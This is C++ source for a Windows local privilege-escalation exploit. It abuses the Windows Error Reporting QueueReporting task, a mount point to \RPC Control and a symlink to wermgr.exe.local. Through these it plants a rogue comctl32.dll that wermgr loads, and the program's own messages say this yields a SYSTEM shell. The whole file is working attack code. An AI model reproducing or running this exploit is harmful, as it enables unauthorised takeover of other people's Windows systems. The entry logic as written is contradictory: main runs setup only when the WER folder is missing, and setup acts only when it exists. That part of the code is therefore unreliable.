#include "stdafx.h"
#include <CommonUtils.h>
#include <FileSymlink.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "atlbase.h"
#include <string>
#include <ReparsePoint.h>

using namespace std;

LPCWSTR WERPath = L"C:\\ProgramData\\Microsoft\\Windows\\WER";

auto getProcessFilename() {
	wchar_t process_filenamebuf[MAX_PATH]{ 0x0000 };
	GetModuleFileName(0, process_filenamebuf, MAX_PATH);
	static auto process_filename = wstring{ process_filenamebuf };
	return process_filename;
}

int setup()
{
	printf("\n[*]Setting things up!\n");
	LPCWSTR temp = L"\\temp";

	wstring wPath = WERPath;
	wstring wTemp = L"\\temp";
	wstring fullTemp = wPath + wTemp;

	system("schtasks.exe /Run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
	Sleep(5000);

	if (PathFileExists(WERPath))
	{
		//LPCTSTR rDir = TEXT("C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp");
		printf("[*]Deleting Temp folder!");
		LPCTSTR rDir = (wchar_t*)fullTemp.c_str();
		RemoveDirectory(rDir);
		
		printf("\n[*]Creating MountPoint from WER to RPC Control!");
		if (!ReparsePoint::CreateMountPoint(WERPath, L"\\RPC Control", L""))
		{
			printf("\n[-]Error creating mount point - %ls\n", GetErrorMessage().c_str());
			return 0;
		}

		printf("\n[*]Creating Symlink from RPC Control to wermgr.exe.local!\n");
		LPCTSTR NewPath2 = TEXT("\\RPC Control\\temp");
		LPCTSTR NewTarget2 = TEXT("\\??\\C:\\Windows\\System32\\wermgr.exe.local");

		HANDLE symlink = nullptr;
		symlink = ::CreateSymlink(nullptr, NewPath2, NewTarget2);
		Sleep(5000);
		if (!symlink)
		{
			printf("Error creating symlink point - %ls\n", GetErrorMessage().c_str());
			printf("Exploit Failed\n");
			return 0;
		}

		system("schtasks.exe /Run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
		Sleep(5000);
		
		LPCTSTR lpDir = TEXT("C:\\ProgramData\\Microsoft\\Windows\\WER\\temp\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_ca04af081b815d21\\");
		auto lpFile = getProcessFilename() + L"comctl32.dll";

		TCHAR currPath[MAX_PATH] = { 0 };
		TCHAR* currEnd = nullptr;

		GetModuleFileName(NULL, currPath, MAX_PATH);
		currEnd = wcsrchr(currPath, '\\');
		*currEnd = 0;

		wcscat_s(currPath, L"\\comctl32.dll");

		LPCTSTR lpDir1 = TEXT("C:\\ProgramData\\Microsoft\\Windows\\WER\\temp\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_ca04af081b815d21\\comctl32.dll");
		//LPWSTR lpFile = (LPWSTR)currPath;


		//LPCTSTR lpDir1 = TEXT("C:\\Windows\\System32\\wermgr.exe.local\\amd64_microsoft.windows.common - controls_6595b64144ccf1df_6.0.19041.488_none_ca04af081b815d21\\");

		printf("[*]Symlink Created!!\n");
		printf("[*]Running Windows Error reporting task - Create wermgr.exe.local folder\n");

		Sleep(5000);
		system("schtasks.exe /Run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
		Sleep(5000);

		//wprintf(currPath);

		//printf("\n[*]Creating directory");

		if (CreateDirectory(lpDir, nullptr))
		{
			printf("[*]Moving dll file to obtain system shell!!");
			if (!CopyFile(currPath, lpDir1, FALSE))
			{
				printf("\n[-]Error copying file - %ls\n", GetErrorMessage().c_str());
			}
		}
		else
		{
			printf("\n[-]Error creating directory - %ls\n", GetErrorMessage().c_str());
		}

		printf("\n[*]Running Windows Error reporting task - To Pop-up System shell");
		printf("\n[*]Waiting for shell to pop-up\n");

		Sleep(5000);
		system("schtasks.exe /Run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");

	}

}

int _tmain(int argc, _TCHAR* argv[])
{
	if (!PathFileExists(WERPath))
	{
		int f;
		printf("\n[*]WER folder does not exist!");
		if (!setup())
		{
			printf("\n[-]Exploit Failed");
			printf("\n[-]Exiting!!");
		}
	}
	else
	{
		printf("\n[!]WER folder exists cannot proceed!");
	}
}